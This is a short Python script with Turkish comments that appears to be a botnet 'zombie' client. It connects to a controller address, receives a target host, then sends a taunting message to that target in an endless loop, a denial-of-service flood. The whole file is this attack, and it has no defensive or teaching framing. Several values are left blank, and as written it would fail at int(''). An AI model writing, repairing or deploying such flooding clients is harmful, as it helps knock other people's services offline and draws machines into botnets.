import socket
import threading
baglanilacakip= '' #bağlanılacak ip adresi
baglanilacakport= '' #int tipinden bağlanılacak port

soket= socket.socket()
soket.connect((baglanilacakip,baglanilacakport))
host= soket.recv(1024)
port= '' #port gir
while True:
 soket.sendto(b"LETS GO ZOMBIES!! ANTITRIX POWER ,RESPECT TO EMROVSKY", (str(host), int(port)))
